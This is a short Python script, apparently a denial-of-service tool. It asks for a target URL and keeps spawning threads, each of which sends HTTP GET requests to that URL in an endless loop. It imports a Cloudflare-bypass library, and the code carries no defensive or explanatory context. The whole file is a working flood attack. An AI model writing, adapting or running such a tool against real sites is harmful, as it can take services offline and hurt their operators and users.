import httpx,threading,os,time,cloudscraper,socket
from threading import Thread
from random import choice
from os import system
scraper = cloudscraper.create_scraper()
def httpx1():
        while True:
            r = httpx.get(url).status_code
            if r == 200:
                print(" 200 requests ")
            elif r == 502:
                print(" 502 requests ")
if __name__ == "__main__":
    os.system('cls')
    url = input(" URL : ")
    thread = int(input(" Thread : "))
while True:
        threading.Thread(target=httpx1).start()
        time.sleep(0.2)
